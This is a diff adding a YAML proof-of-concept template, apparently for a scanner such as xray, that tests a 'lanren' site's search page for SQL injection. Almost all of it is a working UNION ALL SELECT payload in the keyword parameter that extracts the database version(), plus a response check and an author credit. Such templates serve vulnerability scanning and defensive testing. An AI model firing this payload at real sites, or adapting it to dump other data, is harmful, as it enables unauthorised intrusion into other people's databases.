@@ -1,0 +1,16 @@
+name: poc-yaml-lanren-search-sql
+transport: http
+  
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /search.html?keyword='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x2d2d2d2d2d,version(),0x2d2d2d2d2d),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-
+    expression: response.status == 200 && response.body.bcontains(b'-----')
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139185618
